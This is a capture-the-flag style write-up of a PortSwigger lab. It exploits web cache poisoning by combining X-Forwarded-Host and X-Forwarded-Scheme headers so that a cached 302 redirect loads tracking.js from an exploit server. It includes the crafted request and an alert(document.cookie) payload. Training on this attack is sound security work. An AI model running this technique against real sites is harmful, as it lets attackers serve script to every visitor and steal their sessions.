# Web Cache Poisoning Lab 3 — Web cache poisoning with multiple headers — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** Web Cache Poisoning
**Lab:** Web cache poisoning with multiple headers
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~06:20 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed
**Instance:** https://0abb0018039a1a988218deb40023002f.web-security-academy.net/
**Exploit server:** https://exploit-0aff000b03121a72829ddde5016e006c.exploit-server.net

## Vulnerability Type

Web cache poisoning via two unkeyed headers (`X-Forwarded-Host` + `X-Forwarded-Scheme`) leading to stored XSS — the tracking script is only fetched over HTTPS, so the attacker must force a redirect whose `Location` points at the exploit server.

## Solution

1. Requested `/resources/js/tracking.js` with a cache buster and `X-Forwarded-Host: example.com` — no effect. Replaced it with `X-Forwarded-Scheme: nothttps` and got a 302 redirecting the same URL to `https://…` — the scheme header controls the redirect target's scheme.
2. Combined both headers; the 302 `Location` became `https://example.com/resources/js/tracking.js`:
   ```
   GET /resources/js/tracking.js?cb=1234 HTTP/1.1
   Host: 0abb0018039a1a988218deb40023002f.web-security-academy.net
   X-Forwarded-Host: example.com
   X-Forwarded-Scheme: nothttps
   ```
   The 302 is cacheable, so this redirect response itself is the poison — any visitor following it is sent to the attacker's host for the script.
3. Stored the exploit file on the lab's exploit server at `/resources/js/tracking.js` with body `alert(document.cookie)`.
4. Replayed the request with `X-Forwarded-Host: exploit-0aff000b03121a72829ddde5016e006c.exploit-server.net` and `X-Forwarded-Scheme: nothttps` (cache buster removed) until the cached 302 pointed at the exploit server; the victim visited and the home page showed "Congratulations, you solved the lab!"

Full solver: `~/workspace/scripts/ps-cache-poisoning.py` (Lab 3).

## Practical Explanation

- **Why two headers are needed:** `X-Forwarded-Host` alone does nothing here — the tracking script URL is only rebuilt when the app thinks the request came in over plain HTTP. `X-Forwarded-Scheme: nothttps` triggers the "redirect to HTTPS" logic, and only then does `X-Forwarded-Host` get used to build the redirect target.
- **Why a 302 can be the poison:** the redirect response is cacheable, so the cache stores "tracking.js lives at the attacker's URL" and hands that to every visitor; the browser then fetches the script from the exploit server.
- **Probing order matters:** testing each header alone shows nothing; the vulnerability only appears when both are sent together.

## Lessons Learned

- Cache poisoning often needs a *combination* of unkeyed inputs — a single-header probe can miss the bug entirely.
- Redirects are cacheable responses too: poisoning a 302 is just as effective as poisoning a 200.
- Headers like `X-Forwarded-Scheme` exist to tell the app what the client-facing scheme was — trusting them lets an attacker rewrite where the site sends its own users.
